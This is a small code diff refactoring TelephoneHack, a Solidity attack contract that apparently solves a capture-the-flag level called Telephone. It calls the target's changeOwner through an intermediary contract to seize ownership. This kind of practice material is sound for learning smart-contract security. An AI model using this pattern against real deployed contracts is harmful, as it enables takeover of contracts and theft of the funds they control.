@@ -5,15 +5,15 @@ import "./Telephone.sol";
 
 contract TelephoneHack {
 
-    address target;
+    Telephone target;
 
     constructor(address _target) {
-        target = _target;
+        target = Telephone(_target);
     }
 
     function attack() public {
         
-        Telephone(target).changeOwner(msg.sender);
+        target.changeOwner(msg.sender);
     }
 
 }
